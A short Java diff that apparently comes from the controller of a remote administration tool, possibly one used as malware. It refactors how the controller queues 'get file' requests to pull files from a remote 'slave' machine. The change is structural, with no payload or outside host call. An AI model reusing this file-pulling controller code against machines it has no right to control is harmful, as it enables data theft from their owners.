@@ -11,7 +11,7 @@ import com.redpois0n.Slave;
 import com.redpois0n.Traffic;
 import com.redpois0n.common.io.FileIO;
 import com.redpois0n.common.io.TransferListener;
-import com.redpois0n.packets.OutgoingHeader;
+import com.redpois0n.packets.outgoing.Packet21GetFile;
 import com.redpois0n.ui.frames.FrameFileTransfer;
 import com.redpois0n.ui.frames.FrameRemoteFiles;
 
@@ -75,7 +75,7 @@ public class Packet29ReceiveFile extends AbstractIncomingPacket {
 					}
 					String f = localData.getRemoteFiles().get(0);
 					localData.getRemoteFiles().remove(0);
-					slave.addToSendQueue(new PacketBuilder(OutgoingHeader.GET_FILE, f));
+					slave.addToSendQueue(new Packet21GetFile(f));
 				} else {
 					JOptionPane.showMessageDialog(null, "All file transfers were done successfully.", "Success", JOptionPane.INFORMATION_MESSAGE);			
 					data.remove(localData);
